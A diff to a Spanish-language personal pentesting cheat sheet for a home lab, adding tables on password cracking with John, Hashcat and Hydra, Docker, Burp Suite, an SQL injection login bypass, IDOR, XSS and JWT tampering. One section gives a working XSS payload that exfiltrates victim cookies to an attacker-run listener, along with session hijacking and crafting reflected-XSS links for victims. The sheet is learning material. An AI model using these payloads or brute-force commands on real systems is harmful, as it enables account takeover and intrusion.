@@ -5,7 +5,7 @@ conseguir**, no por herramienta. `IP` = la IP del objetivo (en mi lab, Metasploi
 
 > Solo se practica en mi laboratorio o con autorización por escrito.
 
-**Última actualización:** Lección 08
+**Última actualización:** Lección 10
 
 ---
 
@@ -219,5 +219,67 @@ Gravedad CVSS: 0,1-3,9 baja · 4,0-6,9 media · 7,0-8,9 alta · 9,0-10,0 crític
 | Ver usuarios del sistema (desde `shell`) | `cat /etc/passwd` |
 | Ver hashes de contraseñas, solo como root (desde `shell`) | `cat /etc/shadow` |
 
+## 17. Cracking de contraseñas
+| Quiero... | Comando |
+|---|---|
+| Combinar passwd+shadow para John | `unshadow passwd.txt shadow.txt > hashes.txt` |
+| Crackear hashes con diccionario | `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` |
+| Ver lo ya encontrado | `john --show hashes.txt` |
+| Probar variantes (mayúsculas, números al final...) | `john --wordlist=... --rules hashes.txt` |
+| Crackear con GPU (Hashcat) | `hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt` (`-m`=tipo de hash, `-a 0`=modo diccionario) |
+| Atacar un servicio en vivo, una credencial | `hydra -l usuario -p contraseña ssh://IP` |
+| Atacar un servicio en vivo, lista de contraseñas | `hydra -l usuario -P lista.txt ssh://IP` |
+
+Identificar el tipo de hash en `/etc/shadow`: `$1$`=MD5 · `$5$`=SHA-256 · `$6$`=SHA-512 · `$2y$`/`$2b$`=bcrypt.
+Cracking de hash = rápido y sin ruido (offline) · Hydra = lento y detectable (ataca por red, en vivo).
+
+## 18. Docker
+| Quiero... | Comando |
+|---|---|
+| Instalar Docker | `sudo apt install -y docker.io && sudo systemctl enable --now docker` |
+| Usarlo sin sudo | `sudo usermod -aG docker $USER` (cerrar sesión y volver a entrar) |
+| Arrancar un contenedor | `docker run -d -p HOST:CONTENEDOR --name NOMBRE IMAGEN` |
+| Ver contenedores activos / todos | `docker ps` / `docker ps -a` |
+| Parar / arrancar | `docker stop NOMBRE` / `docker start NOMBRE` |
+| Eliminar | `docker rm NOMBRE` |
+| Ver logs | `docker logs NOMBRE` |
+| Entrar dentro del contenedor | `docker exec -it NOMBRE sh` |
+| Ver imágenes descargadas | `docker images` |
+| Reinicio realmente limpio (borra estado en memoria) | `docker stop NOMBRE && docker rm NOMBRE && docker run ...` (mejor que solo `docker restart`) |
+
+## 19. Burp Suite y auditoría web manual
+| Quiero... | Cómo |
+|---|---|
+| Configurar el proxy en Firefox | Configuración → Red → proxy manual `127.0.0.1:8080` (marcar también HTTPS) |
+| Evitar que Firefox excluya el tráfico del proxy | No usar `localhost`; acceder por la IP real de Kali (`http://10.0.2.15:PUERTO`) |
+| Capturar peticiones | Proxy → Intercept → "Intercept is on" (mejor activarlo justo antes de la acción) |
+| Reenviar una petición pausada | Botón **Forward** |
+| Ver el historial de peticiones ya hechas | Proxy → HTTP history |
+| Modificar y reenviar una petición | Clic derecho → **Send to Repeater** → editar → **Send** |
+| Encontrar la petición real de una SPA (Angular/React) | Pestaña **Red/Network** del navegador (F12), la URL visible no siempre es la petición real |
+| Probar bypass de login por SQL injection | Campo email: `' OR 1=1--` / contraseña: cualquiera |
+| Probar un IDOR | Cambiar el ID numérico del recurso en la petición (ej. `/rest/basket/N`) por otro |
+
+## 20. XSS y JWT
+| Quiero... | Cómo |
+|---|---|
+| Probar XSS si `<script>` está filtrado | `<iframe src="javascript:alert('XSS')">` |
+| Ver mi propio JWT | F12 → Almacenamiento/Application → Local Storage o Cookies → `token` |
+| Decodificar un JWT (header y payload) | Pegarlo en `jwt.io` (solo en laboratorio, nunca un token de una cuenta real) |
+| Dónde puede viajar el token en una petición | Cabecera `Authorization: Bearer ...` **o** dentro de `Cookie: token=...`, según la ruta |
+| Romper la firma de un JWT a propósito (comprobar validación) | En Burp Repeater, cambiar un carácter del token y Send |
+| Reiniciar un contenedor dejando estado realmente limpio | `docker stop NOMBRE && docker rm NOMBRE && docker run ...` |
+
+## 21. Robo de cookies vía XSS y comparación de puntos de inyección
+| Quiero... | Cómo |
+|---|---|
+| Ver si una cookie es robable por JavaScript | F12 → Almacenamiento → Cookies → columna `HttpOnly` (`false` = robable) |
+| Montar un servidor para recibir datos exfiltrados | `python3 -m http.server 4444` |
+| Exfiltrar la cookie de la víctima con un XSS | `<iframe src="javascript:fetch('http://IP:4444/robo?c='+document.cookie)">` |
+| Usar una cookie robada para suplantar la sesión | `curl -H "Cookie: token=TOKEN" http://IP:3000/rest/user/whoami` |
+| Construir un enlace de XSS reflejado para enviar a una víctima | Codificar el payload en la URL (`<`→`%3C`, `"`→`%22`, espacio→`%20`...) y meterlo en el parámetro vulnerable (ej. `?q=`) |
+| Comprobar si un campo guarda el payload tal cual, lo escapa o lo rechaza | Clic derecho sobre el resultado → Inspeccionar, y mirar el HTML generado |
+| Ver si una página usa Angular (SPA) o es renderizada por el servidor | Pestaña Red: una recarga completa `POST → 302 → GET` (en vez de llamadas a `/rest/...`) indica servidor/plantilla, no SPA |
+
 ## Pendiente de añadir en próximas lecciones
-Escalada de privilegios, contraseñas (Hydra), Wireshark y detección con SIEM.
+Escaneo automatizado (OWASP ZAP), control de acceso por roles, Active Directory, Wireshark y detección con SIEM.
